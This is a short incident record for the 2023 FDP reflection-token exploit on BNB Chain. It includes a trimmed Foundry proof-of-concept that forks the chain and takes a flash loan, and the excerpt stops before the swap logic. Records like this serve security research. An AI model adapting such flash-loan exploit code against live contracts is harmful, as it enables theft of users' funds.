# [?] - FDP - Reflection token

## Summary
Severity: Unknown
Chain: BNB Chain
Component: FDP
Published: 2023-02-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/FDP_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~16 WBNB
References:
- https://bscscan.com/tx/0x09925028ce5d6a54801d04ff8f39e79af6c24289e84b301ddcdb6adfa51e901b
- https://twitter.com/BeosinAlert/status/1622806011269771266

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Attacker: https://bscscan.com/address/0xc726bd0e973722e17eb088b8fcfedaa931fa0293
// Attack Contract: https://bscscan.com/address/0xe02970bd38b283c3079720c1e71001abe001bc83
// Attack Tx: https://phalcon.blocksec.com/tx/bsc/0x09925028ce5d6a54801d04ff8f39e79af6c24289e84b301ddcdb6adfa51e901b
//            https://bscscan.com/tx/0x09925028ce5d6a54801d04ff8f39e79af6c24289e84b301ddcdb6adfa51e901b

// @Analysis
// https://twitter.com/BeosinAlert/status/1622806011269771266

contract Exploit is Test {
    IWETH private constant WBNB = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    reflectiveERC20 private constant FDP = reflectiveERC20(0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07);
    IUniswapV2Pair private constant FDP_WBNB = IUniswapV2Pair(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3);

    IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle private constant DPP = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);

    function testHack() external {
        vm.createSelectFork("bsc", 25_430_418);

        // flashloan 16.32 WBNB
        DPP.flashLoan(16.32 ether, 0, address(this), "0x1");
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        // console.log("%s FDP in Pair before swap", FDP.balanceOf(address(FDP_WBNB)) / 1e18);  // putting console.log here make test fail ?

        // swap some WBNB to FDP
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/FDP_exp.sol_
